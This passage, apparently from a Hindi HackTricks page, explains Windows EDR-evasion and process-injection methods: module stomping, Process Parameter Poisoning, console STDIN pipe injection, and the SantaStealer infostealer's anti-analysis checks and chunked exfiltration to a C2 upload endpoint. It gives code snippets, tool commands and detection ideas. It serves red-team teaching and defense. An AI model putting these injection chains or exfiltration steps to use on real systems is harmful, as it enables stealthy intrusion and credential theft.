- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास `GetThreadContext`/`SetThreadContext` का इस्तेमाल।
- `NtQueryInformationThread` के बाद मौजूदा thread की TEB/TIB stack bounds में सीधे writes।
- `NtQueueApcThread`/`NtAlertResumeThread` chains, जो अप्रत्यक्ष रूप से `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुंचती हैं।
- Signed modules के अंदर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसी छोटी gadget signatures का बार-बार इस्तेमाल।

## Precision Module Stomping

Module stomping में payloads को target process के अंदर पहले से mapped DLL के **`.text` section से execute** किया जाता है, बजाय इसके कि स्पष्ट private executable memory allocate की जाए या कोई नई sacrificial DLL load की जाए। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसका code space payload को समायोजित कर सके और process को अब भी जिन code paths की जरूरत है, वे corrupt न हों।<sup>[[1]](#references)[[2]](#references)</sup>

### विश्वसनीय target चुनना

`uxtheme.dll` या `comctl32.dll` जैसे आम modules को बिना जांचे stomping के लिए इस्तेमाल करना नाज़ुक है: DLL remote process में load न हुई हो सकती है, और बहुत छोटा code region process को crash कर सकता है। अधिक विश्वसनीय workflow:

1. Target process के modules enumerate करें और पहले से loaded DLLs की **केवल नामों वाली include list** रखें।
2. पहले payload बनाएं और उसका **सटीक byte size** दर्ज करें।
3. Disk पर candidate DLLs scan करें और PE section के **`.text` `Misc_VirtualSize`** की तुलना payload size से करें। यह file size से अधिक महत्वपूर्ण है, क्योंकि इससे executable section का आकार पता चलता है **जब वह memory में mapped होता है**।
4. **Export Address Table (EAT)** parse करें और stomp के शुरुआती offset के रूप में किसी exported function RVA को चुनें।
5. **Blast radius** की गणना करें: अगर payload चुने गए function की सीमा से बड़ा है, तो यह memory में उसके बाद रखे गए adjacent exports को overwrite करेगा।

आमतौर पर इस्तेमाल होने वाले recon/selection helpers:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

संचालन संबंधी नोट्स
- `LoadLibrary`/unexpected image loads की telemetry से बचने के लिए remote process में **पहले से loaded** DLLs को प्राथमिकता दें।
- ऐसे exports को प्राथमिकता दें जिन्हें target application बहुत कम execute करता हो; अन्यथा thread creation से पहले या बाद में सामान्य code paths stomped bytes तक पहुँच सकते हैं।
- बड़े implants के लिए अक्सर shellcode embedding को string literal से **byte-array/braced initializer** में बदलना आवश्यक होता है, ताकि injector source में पूरा buffer सही तरह दर्शाया जाए।

Detection के तरीके
- अधिक आम private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से मेल नहीं खाते।
- Remote threads या context pivots, जो किसी legitimate DLL export के भीतर execution शुरू करते हैं, जिसके शुरुआती bytes हाल ही में modified किए गए हों।
- DLL `.text` pages पर संदिग्ध `VirtualProtect(Ex)` / `WriteProcessMemory` sequences, जिनके बाद thread creation हो।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows **चुने हुए `CreateProcessW` startup parameters को child process में copy करता है** और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) में store करता है।<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` द्वारा copy किए जाने वाले poisonable carriers

उपयोगी carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` के साथ) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Carriers के लिए व्यावहारिक सीमाएँ:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए, और इसकी सीमा null terminator सहित **32,767 Unicode characters** है।
- `lpEnvironment` एक Unicode environment block होना चाहिए, जिसमें क्रमिक `NAME=VALUE\0` strings हों और अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` आधिकारिक रूप से reserved है, इसलिए `ShellInfo` mapping को स्थिर, documented contract के बजाय implementation detail मानना चाहिए।

इससे सामान्य process creation **payload-transfer primitive** बन जाता है। Operator attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote write APIs के बिना remote lookup flow

Child बनने के बाद, **read-only** primitives से copied buffer का पता लगाएँ:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` तक जाएँ
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. चुने गए pointer का उपयोग करें:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

न्यूनतम flow:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### कॉपी किए गए पैरामीटर बफ़र को execute करना

कॉपी किया गया parameter region आमतौर पर `RW` होता है, executable नहीं। एक सामान्य P3 chain यह है:

1. Process को सामान्य तरीके से बनाएँ (suspended नहीं)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` से चुने गए parameter page को executable बनाएँ
3. `PROCESS_INFORMATION` में पहले से लौटाए गए main thread handle का फिर से उपयोग करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` को overwrite करें) से execution redirect करें

Classic thread hijacking workflows से अलग, इसके लिए `SuspendThread` / `ResumeThread` की **ज़रूरत नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आमतौर पर monitor की जाने वाली कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` भी

### Null-byte की सीमा और staged shellcode

तीनों carriers **string या string-जैसे data** हैं, इसलिए `0x00` वाला raw payload transfer के दौरान truncate हो जाता है। इसका एक व्यावहारिक उपाय है एक **null-free first stage**, जो runtime पर constants को फिर से बनाता है और फिर कोई भी second stage load करता है।

एक सरल pattern XOR-आधारित constant synthesis है:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

इससे first stage, transported parameter में null bytes embed किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बना सकता है।

### First stage से stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs call करने हों, तो वह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` से उसकी protection को `PAGE_EXECUTE_READ` में बदला जा सकता है, और फिर उस पर jump किया जा सकता है। इससे सीधे RWX allocation की ज़रूरत नहीं पड़ती।

### Detection ideas

लेखकों द्वारा बताए गए अच्छे hunting अवसर:

- `VirtualProtectEx` / `NtProtectVirtualMemory` द्वारा **process-parameter pages को executable बनाना**
- उस protection change के बाद `SetThreadContext` / `NtSetContextThread का इस्तेमाल
- `PEB` और फिर `RTL_USER_PROCESS_PARAMETERS` को remote तौर पर पढ़ना
- process creation के दौरान असामान्य रूप से लंबे / high-entropy `lpCommandLine`, `lpEnvironment` या `STARTUPINFO.lpReserved` values

### Notes

- P3 एक **cross-process transfer trick** है, अपने आप में पूर्ण execution primitive नहीं: copy किए गए parameter को अभी भी execute permission change और execution redirection method की ज़रूरत होती है।
- लेखकों ने `RtlCreateProcessReflection` / Dirty Vanity पर विचार किया, लेकिन उसे अस्वीकार कर दिया क्योंकि वह internally `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे suspicious primitives का इस्तेमाल करता है।

## Console STDIN pipe injection

एक interactive console child को **payload-transfer primitive** के रूप में भी इस्तेमाल किया जा सकता है। Injector child के standard input को pipe पर redirect करता है और एक marker के बाद shellcode भेजता है। Console program द्वारा data को अपनी private memory में पढ़ लेने के बाद, injector उस buffer को ढूँढता है, उसे executable बनाता है और child thread को उस पर redirect करता है। इससे `VirtualAllocEx` और `WriteProcessMemory` का इस्तेमाल टल जाता है, लेकिन यह फिर भी process injection है, कोई सामान्य EDR bypass नहीं।<sup>[[41]](#references)</sup>

"named-pipe" विवरण के बावजूद, reference implementation `CreatePipe` call करता है, जो एक **anonymous pipe** बनाता है। Windows anonymous pipes को internally uniquely named pipe objects के ज़रिए लागू करता है, लेकिन PoC न तो `\\.\pipe\<name>` path चुनता है, न ही `CreateNamedPipe` call करता है। यह default security descriptor वाले inheritable handles बनाता है, read handle को `STARTUPINFO.hStdInput` में रखता है, `STARTF_USESTDHANDLES` set करता है और handle inheritance enabled रखकर नया child launch करता है। इसलिए, यह PoC दिए गए console executable को launch करता है; यह अपने pipe को किसी मौजूदा process से attach नहीं करता।<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Reference workflow

Implementation इस chain का इस्तेमाल करता है:<sup>[[41]](#references)</sup>

1. Child के `STDIN` और `STDOUT` के लिए anonymous pipe pairs बनाएँ। Parent-side के दोनों handles पर inheritance clear करें और process creation के बाद parent में child-side duplicates बंद करें।
2. `CREATE_NEW_CONSOLE` के साथ `netsh.exe` या `nslookup.exe` जैसे interactive executable को launch करें। Child redirected standard handles inherit करता है।
3. Parent-side `STDIN` handle के ज़रिए `WriteFile` से पूरा binary `rawData` array भेजें। Console program bytes को consume करता है और अपनी private committed regions में से किसी एक में एक copy छोड़ देता है।
4. `VirtualQueryEx` से child के address space को देखें, `ReadProcessMemory` से candidate `MEM_PRIVATE` regions पढ़ें और `rawData` की शुरुआत में marker खोजें।
5. खोजे गए buffer की protection को `VirtualProtectEx` से `PAGE_EXECUTE_READWRITE` में बदलें।
6. Main thread की पहचान करें, उसे suspend करें, `NtSetContextThread` से `RIP` को `found_address + 0x19` पर set करें और उसे resume करें।

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

दिया गया implementation x64-specific है: यह `CONTEXT.Rip` को संशोधित करता है, और इसमें embedded payload x64 shellcode है। `rawData` की शुरुआत 25-byte marker से होती है, इसलिए executable bytes hexadecimal offset `0x19` से शुरू होते हैं। Payload बदलते समय इस layout को बनाए रखें, या marker, search vector, array size और execution offset को एक साथ अपडेट करें। Source comments में `0x0A`, `0x0D` और `0x1A` को bad characters के रूप में भी सूचीबद्ध किया गया है। यह workflow child के token या privileges को नहीं बदलता।<sup>[[41]](#references)</sup>

छोटे native helpers और payload compilation patterns के लिए, [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) देखें।

## Fileless Evasion और Credential Theft के लिए SantaStealer Tradecraft

SantaStealer (aka BluelineStealer) दिखाता है कि कैसे आधुनिक info-stealers AV bypass, anti-analysis और credential access को एक ही workflow में जोड़ते हैं।<sup>[[24]](#references)</sup>

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`), `GetKeyboardLayoutList` के ज़रिए installed keyboard layouts की सूची बनाता है। Cyrillic layout मिलने पर, sample एक खाली `CIS` marker बनाकर stealers चलाने से पहले terminate हो जाता है। इससे यह excluded locales पर कभी detonate नहीं होता, जबकि hunting के लिए एक artifact छोड़ जाता है।

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Layered `check_antivm` logic

- Variant A process list में चलता है, हर नाम का custom rolling checksum निकालता है और उसे debuggers/sandboxes की embedded blocklists से मिलाता है; फिर computer name पर checksum दोहराता है और `C:\analysis` जैसी working directories की जाँच करता है।
- Variant B system properties (process-count floor, हाल का uptime) की जाँच करता है, VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` को call करता है, और single-stepping का पता लगाने के लिए sleep के आसपास timing checks करता है। कोई भी संकेत मिलने पर modules launch होने से पहले प्रक्रिया रोक दी जाती है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper embed होता है, जिसे या तो disk पर लिखा जाता है या memory में manually map किया जाता है; fileless mode में helper imports/relocations को खुद resolve करता है, इसलिए helper artifacts नहीं लिखे जाते।
- यह helper ChaCha20 से दो बार encrypted second-stage DLL रखता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, यह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से निकले exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` को call करता है।<sup>[[25]](#references)</sup>
- ChromElevator routines direct-syscall reflective process hollowing का इस्तेमाल करके एक सक्रिय Chromium browser में inject करती हैं, AppBound Encryption keys inherit करती हैं, और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करती हैं।

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table पर iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, आदि) के लिए एक thread शुरू करता है। हर thread results को shared buffers में लिखता है और लगभग 45s के join window के बाद अपनी file count की रिपोर्ट करता है।
- पूरा होने पर, statically linked `miniz` library का उपयोग करके सब कुछ `%TEMP%\\Log.zip` में zip किया जाता है। फिर `ThreadPayload1` 15s तक sleep करता है और archive को 10 MB chunks में HTTP POST के ज़रिए `http://<C2>:6767/upload` पर stream करता है; इसमें browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) spoof की जाती है। हर chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` जोड़ा जाता है, और आखिरी chunk में `complete: true` जोड़ा जाता है ताकि C2 को पता चले कि reassembly पूरी हो गई है।

## References

- [1] [उन्नत Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ब्लॉग](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: malware के लिए अब कोई free pass नहीं](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – दस्तावेज़](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – उदाहरण](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – उदाहरण](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer के लिए नई Infection Chain और ConfuserEx-आधारित Obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – क्या आपको अपने zero trust पर भरोसा करना चाहिए? Zscaler posture checks को bypass करना](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell से पहले: Storm-2603 के पिछले Ransomware Operations की पड़ताल](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Exports का दुरुपयोग](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security और access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU संदर्भ (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) की मदद से EDRs का मुकाबला](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique से Windows Defender के Protective Shell को तोड़ना](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command संदर्भ](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain के पीछे: RAT से Builder और फिर Coder तक](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer आ रहा है: एक नया, महत्वाकांक्षी Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing से Node.js Malware को निष्क्रिय करना](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace के ज़रिए Adaptix को सुलाना](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET और Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - अपने Dotnet Etw को छिपाना](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations में Chrome Remote Desktop का दुरुपयोग: एक व्यावहारिक मार्गदर्शिका](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kernel Operation Primitive के रूप में Defender के Remediation Driver का weaponization](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo का companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM का उपयोग करके Self-Masking Functions बनाना](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Redirected Input और Output के साथ Child Process बनाना](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
